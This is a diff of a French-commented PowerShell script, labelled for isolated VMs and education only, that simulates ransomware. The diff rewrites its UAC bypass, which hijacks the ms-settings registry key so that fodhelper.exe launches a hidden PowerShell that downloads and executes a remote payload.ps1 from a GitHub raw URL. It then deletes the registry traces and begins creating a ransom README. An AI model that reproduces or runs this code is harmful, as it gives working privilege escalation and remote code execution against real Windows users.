@@ -3,44 +3,37 @@
 # À utiliser UNIQUEMENT en VM isolée - Usage éducatif uniquement
 # ============================================================
 
-# ===== PARTIE 1 : CONTOURNEMENT UAC (à mettre au TOUT DÉBUT) =====
-Write-Host "[*] Tentative de contournement UAC..." -ForegroundColor Cyan
+# ===== VÉRIFIER SI ON EST ADMIN =====
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
-function Bypass-UAC {
-    # Modifie le registre pour piéger fodhelper.exe
+if (-NOT $isAdmin) {
+    # ===== ON N'EST PAS ADMIN → CONTOURNEMENT UAC =====
+    Write-Host "[*] Pas administrateur, tentative de contournement UAC..." -ForegroundColor Yellow
+    
+    # URL du script (à modifier si besoin)
+    $scriptUrl = "https://raw.githubusercontent.com/Taku772/La_Plateforme/refs/heads/test-paylod/payload.ps1"
+    
+    # Modification du registre pour piéger fodhelper.exe
     $registrePath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
     New-Item $registrePath -Force | Out-Null
     New-ItemProperty -Path $registrePath -Name "DelegateExecute" -Value "" -Force
-    
-    # Met votre script en attente dans le registre
-    Set-ItemProperty -Path $registrePath -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Taku772/La_Plateforme/refs/heads/test-paylod/payload.ps1')" -Force
+    Set-ItemProperty -Path $registrePath -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$scriptUrl')" -Force
 
-    # Déclenche fodhelper.exe (qui va exécuter votre script avec les droits admin)
+    # Déclenche fodhelper.exe (va relancer le script en admin)
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
     
-    # Nettoyage du registre après 3 secondes
-    Start-Sleep 3
+    # Attendre que fodhelper.exe ait lu le registre
+    Start-Sleep -Seconds 5
+    
+    # Nettoyer le registre
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-}
-
-# Exécuter le contournement UAC
-Bypass-UAC
-
-# ===== ATTENTION IMPORTANTE =====
-# Après Bypass-UAC, le script va se relancer AUTOMATIQUEMENT en mode administrateur
-# Il faut donc sortir de cette instance pour ne pas créer une boucle infinie
-Write-Host "[*] Contournement UAC declenche. Redemarrage en mode administrateur..." -ForegroundColor Yellow
-exit  # Sort de l'instance non-administrateur
-
-# ===== ÉTAPE 1 : S'exécuter en administrateur =====
-Write-Host "[*] Demarrage de la simulation..." -ForegroundColor Cyan
-
-# Vérifier si on est administrateur, sinon se relancer
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "[*] Relance en administrateur..." -ForegroundColor Yellow
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    
+    Write-Host "[+] Contournement declenche. Fermeture..." -ForegroundColor Green
     exit
 }
+
+# ===== ON EST ADMIN → EXÉCUTION DU PAYLOAD =====
+Write-Host "[*] Execution en mode administrateur - Demarrage de la simulation..." -ForegroundColor Cyan
 
 # ===== ÉTAPE 2 : Créer le README de rançon =====
 Write-Host "[*] Creation du dossier README_RANSOMWARE..." -ForegroundColor Cyan
